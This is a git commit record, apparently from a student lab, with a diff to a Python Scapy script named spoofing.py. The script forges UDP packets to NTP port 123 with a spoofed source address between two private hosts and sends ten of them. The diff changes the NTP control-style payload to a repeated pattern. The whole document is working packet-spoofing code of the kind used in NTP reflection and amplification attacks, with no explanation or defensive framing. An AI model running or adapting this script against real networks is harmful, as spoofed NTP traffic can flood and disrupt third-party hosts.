ecd315c155c3f87989bf7a082d73bff78108908b
nubi12336 <syislu62823@kaist.ac.kr>
2021-04-14 01:27:09 +0900

    d

--- spoofing.py
+++ spoofing.py
@@ -3,7 +3,7 @@ import time
 
 A= "192.168.30.1"
 B= "192.168.20.1"
-C= '\x1e\x0c\x00\x01' + '\x00' * 44
+C= '\x1e\x0c\x00\x01' * 12
 
 spoofed_packet = IP(src=A, dst=B) / UDP(sport=RandShort(), dport=123) / C
 send(spoofed_packet, count=10)
